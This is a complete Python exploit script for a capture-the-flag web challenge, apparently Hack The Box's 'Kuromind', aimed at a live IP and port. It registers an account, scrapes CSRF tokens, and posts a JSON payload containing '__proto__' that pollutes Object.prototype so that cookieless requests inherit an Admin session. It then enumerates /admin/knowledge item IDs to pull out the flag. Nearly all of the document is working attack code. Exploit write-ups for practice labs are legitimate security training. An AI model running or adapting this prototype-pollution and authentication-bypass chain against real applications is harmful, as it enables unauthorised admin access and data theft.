"""
Author: Antigravity
Purpose: Exploit for Kuromind CTF Challenge
Assumptions: Target is reachable at BASE_URL.
Time of creation: 2025-11-22
Expected result: Prints the flag.
Produced result: HTB{...}

Exploit Chain:
1. Prototype Pollution via /user/edit/:id
2. Session Object Inheritance (MemoryStore)
3. Authentication Bypass (Admin Impersonation)
4. Missing Access Control on /admin/knowledge/:id
"""
import requests
import json
import re

BASE_URL = "http://154.57.164.72:31422"
# BASE_URL = "http://localhost:3000"

def register_and_login():
    s = requests.Session()
    import random
    import string
    rand_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    username = f"hacker_{rand_suffix}"
    email = f"hacker_{rand_suffix}@example.com"
    password = "password123"
    
    # Register
    print("[*] Registering...")
    res = s.get(f"{BASE_URL}/register")
    match = re.search(r'name="_csrf" value="([^"]+)"', res.text)
    if not match:
        print(f"[-] CSRF token not found on register page. URL: {res.url}")
        print(res.text[:500])
        return None
    csrf_token = match.group(1)
    
    res = s.post(f"{BASE_URL}/register", data={
        "_csrf": csrf_token,
        "username": username,
        "email": email,
        "password": password,
        "confirmPassword": password
    })
    
    # Login
    print("[*] Logging in...")
    res = s.get(f"{BASE_URL}/login")
    csrf_token = re.search(r'name="_csrf" value="([^"]+)"', res.text).group(1)
    
    res = s.post(f"{BASE_URL}/login", data={
        "_csrf": csrf_token,
        "email": email,
        "password": password
    })
    
    if "dashboard" not in res.url:
        print("[-] Login failed")
        return None
    
    return s

def create_draft(s):
    print("[*] Creating draft...")
    res = s.get(f"{BASE_URL}/user/add")
    csrf_token = re.search(r'name="_csrf" value="([^"]+)"', res.text).group(1)
    
    res = s.post(f"{BASE_URL}/user/add", data={
        "_csrf": csrf_token,
        "title": "Pollution Draft",
        "description": "Pollution Draft Description",
        "tags": "{}"
    })
    
    # Get draft ID from dashboard or drafts page
    res = s.get(f"{BASE_URL}/user/drafts")
    # Find link to edit draft
    match = re.search(r'/user/edit/(\d+)', res.text)
    if match:
        return match.group(1)
    return None

def pollute(s, draft_id):
    print(f"[*] Polluting via draft {draft_id}...")
    res = s.get(f"{BASE_URL}/user/edit/{draft_id}")
    csrf_token = re.search(r'name="_csrf" value="([^"]+)"', res.text).group(1)
    
    # Pollute Object.prototype.user
    # We need username='Admin' and role='admin'
    pollution_payload = {
        "__proto__": {
            "user": {
                "username": "Admin",
                "role": "admin"
            }
        }
    }
    
    res = s.post(f"{BASE_URL}/user/edit/{draft_id}", data={
        "_csrf": csrf_token,
        "title": "Pollution Draft",
        "description": "Pollution Draft Description",
        "tags": json.dumps(pollution_payload)
    })
    
    if res.status_code == 200:
        print("[+] Pollution request sent")
    else:
        print(f"[-] Pollution request failed: {res.status_code}")

def access_admin_knowledge():
    print("[*] Accessing admin knowledge items without session...")
    # Create a NEW session (no cookies)
    s = requests.Session()
    
    # Try to access restricted items (IDs 10-20)
    for i in range(10, 25):
        url = f"{BASE_URL}/admin/knowledge/{i}"
        try:
            res = s.get(url, timeout=5)
            if res.status_code == 200:
                print(f"[+] Found item {i}!")
                # Extract title
                title_match = re.search(r'<title>(.*?) - Library of Thoughts</title>', res.text)
                if title_match:
                    print(f"    Title: {title_match.group(1)}")
                
                # Extract description
                desc_match = re.search(r'<p class="text-neutral-400 mb-4">([^<]+)</p>', res.text)
                if desc_match:
                    desc = desc_match.group(1)
                    print(f"    Description: {desc}")
                    if "HTB{" in desc:
                        print(f"[!!!] FLAG FOUND: {desc}")
                        return True
                else:
                    print(f"[-] Regex failed for item {i}. HTML snippet:")
                    print(res.text[:500]) # Print first 500 chars
                    # Search for HTB{ in the whole text
                    if "HTB{" in res.text:
                         print(f"[!!!] FLAG FOUND IN RAW TEXT: {res.text}")
                         return True
            elif res.status_code == 404:
                print(f"[-] Item {i} not found")
            elif res.status_code == 302:
                 print(f"[-] Item {i} redirected (Access Denied?)")
            else:
                print(f"[-] Item {i} status: {res.status_code}")
        except Exception as e:
            print(f"[-] Error accessing item {i}: {e}")
            
    return False

def main():
    # Server is likely already polluted from previous attempts
    print("[*] Server might already be polluted. Trying to access admin pages...")
    if access_admin_knowledge():
        return

    # If not polluted, try to pollute
    print("[*] Not polluted or flag not found. Trying to pollute...")
    s = register_and_login()
    if not s:
        return
        
    draft_id = create_draft(s)
    if not draft_id:
        print("[-] Could not create draft")
        return
        
    pollute(s, draft_id)
    
    # Now try to access admin pages again
    access_admin_knowledge()

if __name__ == "__main__":
    main()
